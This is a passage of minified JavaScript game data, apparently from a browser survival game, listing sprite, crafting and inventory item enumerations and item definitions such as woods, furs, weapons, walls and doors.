                    INV_CRAB_BOSS: e++,
                    CHEST_CRAB_BOSS: e++,
                    CRAFT_CRAB_BOSS: e++,
                    EMERALD_MACHINE_GROUND: e++,
                    EMERALD_MACHINE_HOLE: e++,
                    EMERALD_MACHINE_ROTATE: e++,
                    INV_EMERALD_MACHINE: e++,
                    CRAFT_EMERALD_MACHINE: e++,
                    CHEST_EMERALD_MACHINE: e++,
                    EXTRACTOR_MACHINE0_STONE: e++,
                    INV_EXTRACTOR_MACHINE_STONE: e++,
                    CRAFT_EXTRACTOR_MACHINE_STONE: e++,
                    CHEST_EXTRACTOR_MACHINE_STONE: e++,
                    EXTRACTOR_MACHINE0_GOLD: e++,
                    INV_EXTRACTOR_MACHINE_GOLD: e++,
                    CRAFT_EXTRACTOR_MACHINE_GOLD: e++,
                    CHEST_EXTRACTOR_MACHINE_GOLD: e++,
                    EXTRACTOR_MACHINE0_DIAMOND: e++,
                    INV_EXTRACTOR_MACHINE_DIAMOND: e++,
                    CRAFT_EXTRACTOR_MACHINE_DIAMOND: e++,
                    CHEST_EXTRACTOR_MACHINE_DIAMOND: e++,
                    EXTRACTOR_MACHINE0_AMETHYST: e++,
                    INV_EXTRACTOR_MACHINE_AMETHYST: e++,
                    CRAFT_EXTRACTOR_MACHINE_AMETHYST: e++,
                    CHEST_EXTRACTOR_MACHINE_AMETHYST: e++,
                    EXTRACTOR_MACHINE0_REIDITE: e++,
                    INV_EXTRACTOR_MACHINE_REIDITE: e++,
                    CRAFT_EXTRACTOR_MACHINE_REIDITE: e++,
                    CHEST_EXTRACTOR_MACHINE_REIDITE: e++,
                    MAMMOTH: e++,
                    HURT_MAMMOTH: e++,
                    BABY_MAMMOTH: e++,
                    BABY_MAMMOTH_TAMED: e++,
                    BABY_MAMMOTH_ATTACK: e++,
                    HURT_BABY_MAMMOTH: e++,
                    INV_BABY_MAMMOTH: e++,
                    CHEST_BABY_MAMMOTH: e++,
                    CRAFT_BABY_MAMMOTH: e++,
                    INV_FLOWER_HAT: e++,
                    CRAFT_FLOWER_HAT: e++,
                    CHEST_FLOWER_HAT: e++,
                    INV_FUR_HAT: e++,
                    CRAFT_FUR_HAT: e++,
                    CHEST_FUR_HAT: e++,
                    INV_FUR_MAMMOTH: e++,
                    CHEST_FUR_MAMMOTH: e++,
                    CRAFT_WOOD_TOWER: e++,
                    INV_WOOD_TOWER: e++,
                    CHEST_WOOD_TOWER: e++,
                    CRAFT_WOOD_SHIELD: e++,
                    INV_WOOD_SHIELD: e++,
                    CHEST_WOOD_SHIELD: e++,
                    CRAFT_STONE_SHIELD: e++,
                    INV_STONE_SHIELD: e++,
                    CHEST_STONE_SHIELD: e++,
                    CRAFT_GOLD_SHIELD: e++,
                    INV_GOLD_SHIELD: e++,
                    CHEST_GOLD_SHIELD: e++,
                    CRAFT_DIAMOND_SHIELD: e++,
                    INV_DIAMOND_SHIELD: e++,
                    CHEST_DIAMOND_SHIELD: e++,
                    CRAFT_AMETHYST_SHIELD: e++,
                    INV_AMETHYST_SHIELD: e++,
                    CHEST_AMETHYST_SHIELD: e++,
                    CRAFT_REIDITE_SHIELD: e++,
                    INV_REIDITE_SHIELD: e++,
                    CHEST_REIDITE_SHIELD: e++,
                    REIDITE_SPIKE2: +e
                }
                , u = (e = 0,
                {
                    FIRE: e++,
                    BIG_FIRE: e++,
                    FURNACE: e++,
                    WORKBENCH: e++,
                    PICK_WOOD: e++,
                    PICK: e++,
                    PICK_GOLD: e++,
                    PICK_DIAMOND: e++,
                    PICK_AMETHYST: e++,
                    PICK_REIDITE: e++,
                    HAMMER: e++,
                    HAMMER_GOLD: e++,
                    HAMMER_DIAMOND: e++,
                    HAMMER_AMETHYST: e++,
                    HAMMER_REIDITE: e++,
                    SUPER_HAMMER: e++,
                    SHOVEL: e++,
                    SHOVEL_GOLD: e++,
                    SHOVEL_DIAMOND: e++,
                    SHOVEL_AMETHYST: e++,
                    WATERING_CAN: e++,
                    WATERING_CAN_FULL: e++,
                    PITCHFORK: e++,
                    PITCHFORK2: e++,
                    BOOK: e++,
                    WOOD_SPEAR: e++,
                    SPEAR: e++,
                    GOLD_SPEAR: e++,
                    DIAMOND_SPEAR: e++,
                    AMETHYST_SPEAR: e++,
                    REIDITE_SPEAR: e++,
                    DRAGON_SPEAR: e++,
                    LAVA_SPEAR: e++,
                    CRAB_SPEAR: e++,
                    SWORD_WOOD: e++,
                    SWORD: e++,
                    SWORD_GOLD: e++,
                    SWORD_DIAMOND: e++,
                    SWORD_AMETHYST: e++,
                    REIDITE_SWORD: e++,
                    SEED: e++,
                    WHEAT_SEED: e++,
                    PUMPKIN_SEED: e++,
                    GARLIC_SEED: e++,
                    THORNBUSH_SEED: e++,
                    CARROT_SEED: e++,
                    TOMATO_SEED: e++,
                    WATERMELON_SEED: e++,
                    ALOE_VERA_SEED: e++,
                    COOKED_MEAT: e++,
                    FOODFISH_COOKED: e++,
                    BREAD: e++,
                    COOKIE: e++,
                    CAKE: e++,
                    BANDAGE: e++,
                    WALL: e++,
                    STONE_WALL: e++,
                    GOLD_WALL: e++,
                    DIAMOND_WALL: e++,
                    AMETHYST_WALL: e++,
                    REIDITE_WALL: e++,
                    WOOD_DOOR: e++,
                    STONE_DOOR: e++,
                    GOLD_DOOR: e++,
                    DIAMOND_DOOR: e++,
                    AMETHYST_DOOR: e++,
                    REIDITE_DOOR: e++,
                    SPIKE: e++,
                    STONE_SPIKE: e++,
                    GOLD_SPIKE: e++,
                    DIAMOND_SPIKE: e++,
                    AMETHYST_SPIKE: e++,
                    REIDITE_SPIKE: e++,
                    WOOD_DOOR_SPIKE: e++,
                    STONE_DOOR_SPIKE: e++,
                    GOLD_DOOR_SPIKE: e++,
                    DIAMOND_DOOR_SPIKE: e++,
                    AMETHYST_DOOR_SPIKE: e++,
                    REIDITE_DOOR_SPIKE: e++,
                    CHEST: e++,
                    EXPLORER_HAT: e++,
                    PIRATE_HAT: e++,
                    PILOT_HELMET: e++,
                    EARMUFFS: e++,
                    COAT: e++,
                    CAP_SCARF: e++,
                    FUR_HAT: e++,
                    WOOD_HELMET: e++,
                    STONE_HELMET: e++,
                    GOLD_HELMET: e++,
                    DIAMOND_HELMET: e++,
                    AMETHYST_HELMET: e++,
                    REIDITE_HELMET: e++,
                    DIVING_MASK: e++,
                    SUPER_DIVING_SUIT: e++,
                    DIAMOND_PROTECTION: e++,
                    AMETHYST_PROTECTION: e++,
                    REIDITE_PROTECTION: e++,
                    TURBAN1: e++,
                    TURBAN2: e++,
                    BAG: e++,
                    PAPER: e++,
                    BLUE_CORD: e++,
                    LOCK: e++,
                    LOCKPICK: e++,
                    TOTEM: e++,
                    BRIDGE: e++,
                    ROOF: e++,
                    WOOD_TOWER: e++,
                    PLOT: e++,
                    BOTTLE_EMPTY: e++,
                    BOTTLE_FULL: e++,
                    BOTTLE_FULL_2: e++,
                    BOTTLE_FULL_3: e++,
                    WINDMILL: e++,
                    RESURRECTION: e++,
                    EMERALD_MACHINE: e++,
                    EXTRACTOR_MACHINE_STONE: e++,
                    EXTRACTOR_MACHINE_GOLD: e++,
                    EXTRACTOR_MACHINE_DIAMOND: e++,
                    EXTRACTOR_MACHINE_AMETHYST: e++,
                    EXTRACTOR_MACHINE_REIDITE: e++,
                    SPANNER: e++,
                    MACHETE: e++,
                    BREAD_OVEN: e++,
                    SANDWICH: e++,
                    DRAGON_HELMET: e++,
                    LAVA_HELMET: e++,
                    CROWN_CRAB: e++,
                    DRAGON_SWORD: e++,
                    LAVA_SWORD: e++,
                    WOOD_BOW: e++,
                    WOOD_ARROW: e++,
                    STONE_BOW: e++,
                    STONE_ARROW: e++,
                    GOLD_BOW: e++,
                    GOLD_ARROW: e++,
                    DIAMOND_BOW: e++,
                    DIAMOND_ARROW: e++,
                    AMETHYST_BOW: e++,
                    AMETHYST_ARROW: e++,
                    REIDITE_BOW: e++,
                    REIDITE_ARROW: e++,
                    DRAGON_BOW: e++,
                    DRAGON_ARROW: e++,
                    WOOD_SHIELD: e++,
                    STONE_SHIELD: e++,
                    GOLD_SHIELD: e++,
                    DIAMOND_SHIELD: e++,
                    AMETHYST_SHIELD: e++,
                    REIDITE_SHIELD: e++,
                    CROWN_GREEN: e++,
                    CROWN_ORANGE: e++,
                    CROWN_BLUE: e++,
                    HOOD: e++,
                    PEASANT: e++,
                    WINTER_HOOD: e++,
                    WINTER_PEASANT: e++,
                    BUCKET_FULL: e++,
                    BUCKET_EMPTY: e++,
                    WELL: e++,
                    SIGN: e++,
                    BED: e++,
                    BOAT: e++,
                    SLED: e++,
                    SADDLE: e++,
                    PLANE: e++,
                    WITCH: e++,
                    WAND1: e++,
                    WAND2: e++,
                    NIMBUS: +e
                })
                , Be = (e = 0,
                {
                    SWORD: e++,
                    PICK: e++,
                    FUR: e++,
                    PICK_GOLD: e++,
                    PICK_DIAMOND: e++,
                    SWORD_GOLD: e++,
                    SWORD_DIAMOND: e++,
                    HAND: e++,
                    PICK_WOOD: e++,
                    PIRATE_SWORD: e++,
                    EARMUFFS: e++,
                    COAT: e++,
                    WOOD_SPEAR: e++,
                    SPEAR: e++,
                    GOLD_SPEAR: e++,
                    DIAMOND_SPEAR: e++,
                    DRAGON_SPEAR: e++,
                    LAVA_SPEAR: e++,
                    CRAB_SPEAR: e++,
                    REIDITE_SWORD: e++,
                    DIAMOND_PROTECTION: e++,
                    AMETHYST_PROTECTION: e++,
                    REIDITE_PROTECTION: e++,
                    EXPLORER_HAT: e++,
                    PIRATE_HAT: e++,
                    STONE_HELMET: e++,
                    GOLD_HELMET: e++,
                    DIAMOND_HELMET: e++,
                    BOOK: e++,
                    BAG: e++,
                    SWORD_AMETHYST: e++,
                    PICK_AMETHYST: e++,
                    PICK_REIDITE: e++,
                    AMETHYST_SPEAR: e++,
                    REIDITE_SPEAR: e++,
                    HAMMER: e++,
                    HAMMER_GOLD: e++,
                    HAMMER_DIAMOND: e++,
                    HAMMER_AMETHYST: e++,
                    HAMMER_REIDITE: e++,
                    CAP_SCARF: e++,
                    CHRISTMAS_HAT: e++,
                    ELF_HAT: e++,
                    AMETHYST_HELMET: e++,
                    REIDITE_HELMET: e++,
                    SUPER_HAMMER: e++,
                    SHOVEL: e++,
                    SUPER_DIVING_SUIT: e++,
                    DIVING_MASK: e++,
                    WATERING_CAN_FULL: e++,
                    SHOVEL_GOLD: e++,
                    SHOVEL_DIAMOND: e++,
                    SHOVEL_AMETHYST: e++,
                    PITCHFORK: e++,
                    PITCHFORK2: e++,
                    SPANNER: e++,
                    MACHETE: e++,
                    SWORD_WOOD: e++,
                    WOOD_HELMET: e++,
                    DRAGON_HELMET: e++,
                    LAVA_HELMET: e++,
                    CROWN_CRAB: e++,
                    DRAGON_SWORD: e++,
                    LAVA_SWORD: e++,
                    WOOD_BOW: e++,
                    STONE_BOW: e++,
                    GOLD_BOW: e++,
                    DIAMOND_BOW: e++,
                    AMETHYST_BOW: e++,
                    REIDITE_BOW: e++,
                    DRAGON_BOW: e++,
                    WOOD_SHIELD: e++,
                    STONE_SHIELD: e++,
                    GOLD_SHIELD: e++,
                    DIAMOND_SHIELD: e++,
                    AMETHYST_SHIELD: e++,
                    REIDITE_SHIELD: e++,
                    CROWN_GREEN: e++,
                    CROWN_ORANGE: e++,
                    CROWN_BLUE: e++,
                    TURBAN1: e++,
                    TURBAN2: e++,
                    PILOT_HELMET: e++,
                    HOOD: e++,
                    PEASANT: e++,
                    WINTER_HOOD: e++,
                    WINTER_PEASANT: e++,
                    FLOWER_HAT: e++,
                    FUR_HAT: e++,
                    SADDLE: e++,
                    WITCH: e++,
                    NIMBUS: e++,
                    WAND1: e++,
                    WAND2: e++,
                    FIREFLY: e++,
                    WOOD_ARROW: e++,
                    STONE_ARROW: e++,
                    GOLD_ARROW: e++,
                    DIAMOND_ARROW: e++,
                    AMETHYST_ARROW: e++,
                    REIDITE_ARROW: e++,
                    DRAGON_ARROW: e++,
                    STONE: e++,
                    WOOD: e++,
                    PLANT: e++,
                    GOLD: e++,
                    DIAMOND: e++,
                    FIRE: e++,
                    WORKBENCH: e++,
                    SEED: e++,
                    MEAT: e++,
                    COOKED_MEAT: e++,
                    BIG_FIRE: e++,
                    FURNACE: e++,
                    PAPER: e++,
                    AMETHYST: e++,
                    AMETHYST_WALL: e++,
                    AMETHYST_SPIKE: e++,
                    AMETHYST_DOOR: e++,
                    BRIDGE: e++,
                    SAND: e++,
                    BOTTLE_FULL: e++,
                    BOTTLE_EMPTY: e++,
                    KRAKEN_SKIN: e++,
                    WATERING_CAN: e++,
                    FLOUR: e++,
                    WHEAT_SEED: e++,
                    COOKIE: e++,
                    WILD_WHEAT: e++,
                    WINDMILL: e++,
                    CAKE: e++,
                    FOODFISH: e++,
                    FOODFISH_COOKED: e++,
                    SCALES: e++,
                    GROUND: e++,
                    PLOT: e++,
                    ICE: e++,
                    BREAD: e++,
                    BREAD_OVEN: e++,
                    SANDWICH: e++,
                    FUR_WINTER: e++,
                    BLUE_CORD: e++,
                    LOCK: e++,
                    DRAGON_HEART: e++,
                    LAVA_HEART: e++,
                    RESURRECTION: e++,
                    EMERALD_MACHINE: e++,
                    EXTRACTOR_MACHINE_STONE: e++,
                    EXTRACTOR_MACHINE_GOLD: e++,
                    EXTRACTOR_MACHINE_DIAMOND: e++,
                    EXTRACTOR_MACHINE_AMETHYST: e++,
                    EXTRACTOR_MACHINE_REIDITE: e++,
                    LOCKPICK: e++,
                    TOTEM: e++,
                    SPIKE: e++,
                    CORD: e++,
                    WALL: e++,
                    STONE_WALL: e++,
                    GOLD_WALL: e++,
                    DIAMOND_WALL: e++,
                    WOOD_DOOR: e++,
                    CHEST: e++,
                    STONE_SPIKE: e++,
                    GOLD_SPIKE: e++,
                    DIAMOND_SPIKE: e++,
                    STONE_DOOR: e++,
                    GOLD_DOOR: e++,
                    DIAMOND_DOOR: e++,
                    FUR_WOLF: e++,
                    GEMME_GREEN: e++,
                    GEMME_ORANGE: e++,
                    GEMME_BLUE: e++,
                    SPECIAL_FUR: e++,
                    SPECIAL_FUR_2: e++,
                    BUCKET_FULL: e++,
                    BUCKET_EMPTY: e++,
                    WELL: e++,
                    SIGN: e++,
                    DRAGON_CUBE: e++,
                    DRAGON_ORB: e++,
                    LAVA_CUBE: e++,
                    LAVA_ORB: e++,
                    PUMPKIN_SEED: e++,
                    PUMPKIN: e++,
                    ROOF: e++,
                    GARLIC_SEED: e++,
                    GARLIC: e++,
                    THORNBUSH_SEED: e++,
                    THORNBUSH: e++,
                    BANDAGE: e++,
                    CRAB_STICK: e++,
                    CRAB_LOOT: e++,
                    BED: e++,
                    SUGAR_CAN: e++,
                    CANDY: e++,
                    GARLAND: e++,
                    REIDITE: e++,
                    FLAME: e++,
                    CARROT_SEED: e++,
                    CARROT: e++,
                    TOMATO_SEED: e++,
                    TOMATO: e++,
                    WATERMELON_SEED: e++,
                    WATERMELON: e++,
                    ALOE_VERA_SEED: e++,
                    ALOE_VERA: e++,
                    WOOD_DOOR_SPIKE: e++,
                    STONE_DOOR_SPIKE: e++,
                    GOLD_DOOR_SPIKE: e++,
                    DIAMOND_DOOR_SPIKE: e++,
                    AMETHYST_DOOR_SPIKE: e++,
                    REIDITE_WALL: e++,
                    REIDITE_DOOR: e++,
                    REIDITE_SPIKE: e++,
                    REIDITE_DOOR_SPIKE: e++,
                    WOOD_TOWER: e++,
                    PENGUIN_FEATHER: e++,
                    BOAT: e++,
                    SLED: e++,
                    MOUNT_BOAR: e++,
                    CRAB_BOSS: e++,
                    BABY_DRAGON: e++,
                    BABY_LAVA: e++,
                    HAWK: e++,
                    PLANE: e++,
                    HAWK_FEATHER: e++,
                    VULTURE_FEATHER: e++,
                    CACTUS: e++,
                    EMERALD: e++,
                    PITCHFORK_PART: e++,
                    PILOT_GLASSES: e++,
                    FUR_BOAR: e++,
                    SANDWORM_JUICE: e++,
                    BABY_MAMMOTH: e++,
                    FUR_MAMMOTH: +e
                })
                , oe = 0
                , ae = 1
                , se = 2
                , _e = 3
                , Ee = 4
                , ue = 5
                , we = []
                , de = (we[Be.WOOD] = {
                    name: "Wood",
                    img: ze.INV_WOOD,
                    grid: 0,
                    recycle: 0
                },
                    we[Be.STONE] = {
                        name: "Stone",
                        img: ze.INV_STONE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.GOLD] = {
                        name: "Gold",
                        img: ze.INV_GOLD,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.DIAMOND] = {
                        name: "Diamond",
                        img: ze.INV_DIAMOND,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.AMETHYST] = {
                        name: "Amethyst",
                        img: ze.INV_AMETHYST,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FUR] = {
                        name: "Rabbit fur",
                        img: ze.INV_FUR,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FUR_WOLF] = {
                        name: "Wolf fur",
                        img: ze.INV_FUR_WOLF,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FUR_BOAR] = {
                        name: "Boar fur",
                        img: ze.INV_FUR_BOAR,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FIREFLY] = {
                        name: "Firefly",
                        img: ze.INV_FIREFLY,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.WOOD_ARROW] = {
                        name: "Wood arrow",
                        img: ze.INV_WOOD_ARROW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.STONE_ARROW] = {
                        name: "Stone arrow",
                        img: ze.INV_STONE_ARROW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.GOLD_ARROW] = {
                        name: "Gold arrow",
                        img: ze.INV_GOLD_ARROW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DIAMOND_ARROW] = {
                        name: "Diamond arrow",
                        img: ze.INV_DIAMOND_ARROW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.AMETHYST_ARROW] = {
                        name: "Amethyst arrow",
                        img: ze.INV_AMETHYST_ARROW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.REIDITE_ARROW] = {
                        name: "Reidite arrow",
                        img: ze.INV_REIDITE_ARROW,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DRAGON_ARROW] = {
                        name: "Dragon arrow",
                        img: ze.INV_DRAGON_ARROW,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FUR_WINTER] = {
                        name: "Winter fur",
                        img: ze.INV_FUR_WINTER,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FUR_MAMMOTH] = {
                        name: "Fur mammoth",
                        img: ze.INV_FUR_MAMMOTH,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.CORD] = {
                        name: "Web",
                        img: ze.INV_CORD,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.MEAT] = {
                        name: "Meat",
                        img: ze.INV_MEAT,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FOODFISH] = {
                        name: "Fish",
                        img: ze.INV_FOODFISH,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.KRAKEN_SKIN] = {
                        name: "Kraken skin",
                        img: ze.INV_KRAKEN_SKIN,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.SCALES] = {
                        name: "Piranha scales",
                        img: ze.INV_SCALES,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.ICE] = {
                        name: "Ice",
                        img: ze.INV_ICE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.SAND] = {
                        name: "Sand",
                        img: ze.INV_SAND,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.GROUND] = {
                        name: "Dirt",
                        img: ze.INV_GROUND,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.PLANT] = {
                        name: "Berrie",
                        img: ze.INV_PLANT,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FLOUR] = {
                        name: "Flour",
                        img: ze.INV_FLOUR,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.WILD_WHEAT] = {
                        name: "Flour",
                        img: ze.INV_WILD_WHEAT,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.SPECIAL_FUR] = {
                        name: "Special fur peasant",
                        img: ze.INV_SPECIAL_FUR,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.SPECIAL_FUR_2] = {
                        name: "Special fur hood",
                        img: ze.INV_SPECIAL_FUR_2,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.PUMPKIN] = {
                        name: "Pumpkin",
                        img: ze.INV_PUMPKIN,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.GARLIC] = {
                        name: "Garlic",
                        img: ze.INV_GARLIC,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.THORNBUSH] = {
                        name: "Thornbush",
                        img: ze.INV_THORNBUSH,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.CARROT] = {
                        name: "Carrot",
                        img: ze.INV_CARROT,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.TOMATO] = {
                        name: "Tomato",
                        img: ze.INV_TOMATO,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.WATERMELON] = {
                        name: "Watermelon",
                        img: ze.INV_WATERMELON,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.ALOE_VERA] = {
                        name: "Aloe Vera",
                        img: ze.INV_ALOE_VERA,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.PENGUIN_FEATHER] = {
                        name: "Penguin Feather",
                        img: ze.INV_PENGUIN_FEATHER,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.HAWK_FEATHER] = {
                        name: "Hawk Feather",
                        img: ze.INV_HAWK_FEATHER,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.VULTURE_FEATHER] = {
                        name: "Vulture Feather",
                        img: ze.INV_VULTURE_FEATHER,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.CACTUS] = {
                        name: "Cactus",
                        img: ze.INV_CACTUS,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.PILOT_GLASSES] = {
                        name: "Cactus",
                        img: ze.INV_PILOT_GLASSES,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.PITCHFORK_PART] = {
                        name: "Pitchfork Part",
                        img: ze.INV_PITCHFORK_PART,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.SANDWORM_JUICE] = {
                        name: "Emerald Machine",
                        img: ze.INV_SANDWORM_JUICE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.EMERALD] = {
                        name: "Emerald",
                        img: ze.INV_EMERALD,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.CHRISTMAS_HAT] = {
                        name: "Christmas Hat",
                        img: ze.INV_CHRISTMAS_HAT,
                        recycle: 0
                    },
                    we[Be.ELF_HAT] = {
                        name: "Elf Hat",
                        img: ze.INV_ELF_HAT,
                        recycle: 0
                    },
                    we[Be.GARLAND] = {
                        name: "Garland",
                        img: ze.INV_GARLAND,
                        recycle: 0,
                        grid: 0
                    },
                    we[Be.CANDY] = {
                        name: "Candy",
                        img: ze.INV_CANDY,
                        recycle: 0
                    },
                    we[Be.SUGAR_CAN] = {
                        name: "Sugar Cane",
                        img: ze.INV_SUGAR_CAN,
                        recycle: 0
                    },
                    we[Be.PIRATE_SWORD] = {
                        name: "Pirate Sword",
                        img: ze.INV_PIRATE_SWORD,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.CRAB_STICK] = {
                        name: "Crab Stick",
                        img: ze.INV_CRAB_STICK,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.REIDITE] = {
                        name: "Reidite",
                        img: ze.INV_REIDITE,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FLAME] = {
                        name: "Flame",
                        img: ze.INV_FLAME,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FIRE] = {
                        name: "Campfire",
                        img: ze.CRAFT_FIRE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.BED] = {
                        name: "Bed",
                        img: ze.CRAFT_BED,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.WORKBENCH] = {
                        name: "Workbench",
                        img: ze.CRAFT_WORK,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SWORD] = {
                        name: "Stone sword",
                        img: ze.CRAFT_SWORD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.PICK] = {
                        name: "Stone pick",
                        img: ze.CRAFT_PICK,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SEED] = {
                        name: "Berries bush",
                        img: ze.CRAFT_SEED,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.PICK_GOLD] = {
                        name: "Gold pick",
                        img: ze.CRAFT_PICK_GOLD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.PICK_DIAMOND] = {
                        name: "Diamond pick",
                        img: ze.CRAFT_PICK_DIAMOND,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SWORD_WOOD] = {
                        name: "Wood sword",
                        img: ze.CRAFT_SWORD_WOOD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SWORD_GOLD] = {
                        name: "Gold sword",
                        img: ze.CRAFT_SWORD_GOLD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SWORD_DIAMOND] = {
                        name: "Diamond sword",
                        img: ze.CRAFT_SWORD_DIAMOND,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.PICK_WOOD] = {
                        name: "Wood pick",
                        img: ze.CRAFT_PICK_WOOD,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.WALL] = {
                        name: "Wood wall",
                        img: ze.CRAFT_WALL,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SPIKE] = {
                        name: "Wood spike",
                        img: ze.CRAFT_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.COOKED_MEAT] = {
                        name: "Cooked meat",
                        img: ze.CRAFT_COOKED_MEAT,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.BIG_FIRE] = {
                        name: "Big campfire",
                        img: ze.CRAFT_BIG_FIRE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.BANDAGE] = {
                        name: "Bandage",
                        img: ze.CRAFT_BANDAGE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.STONE_WALL] = {
                        name: "Stone wall",
                        img: ze.CRAFT_STONE_WALL,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.GOLD_WALL] = {
                        name: "Gold wall",
                        img: ze.CRAFT_GOLD_WALL,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DIAMOND_WALL] = {
                        name: "Diamond wall",
                        img: ze.CRAFT_DIAMOND_WALL,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.WOOD_DOOR] = {
                        name: "Wood door",
                        img: ze.CRAFT_DOOR_WOOD_CLOSE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.CHEST] = {
                        name: "Chest",
                        img: ze.CRAFT_CHEST,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.STONE_SPIKE] = {
                        name: "Stone spike",
                        img: ze.CRAFT_STONE_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.GOLD_SPIKE] = {
                        name: "Gold spike",
                        img: ze.CRAFT_GOLD_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DIAMOND_SPIKE] = {
                        name: "Diamond spike",
                        img: ze.CRAFT_DIAMOND_SPIKE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.STONE_DOOR] = {
                        name: "Stone door",
                        img: ze.CRAFT_DOOR_STONE_CLOSE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.GOLD_DOOR] = {
                        name: "Gold door",
                        img: ze.CRAFT_DOOR_GOLD_CLOSE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DIAMOND_DOOR] = {
                        name: "Diamond door",
                        img: ze.CRAFT_DOOR_DIAMOND_CLOSE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.EARMUFFS] = {
                        name: "Chapka",
                        img: ze.CRAFT_EARMUFFS,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.COAT] = {
                        name: "Big Chapka",
                        img: ze.CRAFT_COAT,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.WOOD_SPEAR] = {
                        name: "Wood spear",
                        img: ze.CRAFT_WOOD_SPEAR,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.SPEAR] = {
                        name: "Stone spear",
                        img: ze.CRAFT_SPEAR,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.GOLD_SPEAR] = {
                        name: "Gold spear",
                        img: ze.CRAFT_GOLD_SPEAR,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DIAMOND_SPEAR] = {
                        name: "Diamond spear",
                        img: ze.CRAFT_DIAMOND_SPEAR,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.DRAGON_SPEAR] = {
                        name: "Dragon spear",
                        img: ze.CRAFT_DRAGON_SPEAR,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.LAVA_SPEAR] = {
                        name: "Dragon spear",
                        img: ze.CRAFT_LAVA_SPEAR,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.CRAB_SPEAR] = {
                        name: "Crab spear",
                        img: ze.CRAFT_CRAB_SPEAR,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.CRAB_LOOT] = {
                        name: "Crab loot",
                        img: ze.INV_CRAB_LOOT,
                        grid: 0,
                        recycle: 0
                    },
                    we[Be.FURNACE] = {
                        name: "Furnace",
                        img: ze.CRAFT_FURNACE,
                        grid: 0,
                        recycle: 1
                    },
                    we[Be.EXPLORER_HAT] = {
                        name: "Explorer hat",
                        img: ze.CRAFT_EXPLORER_HAT,
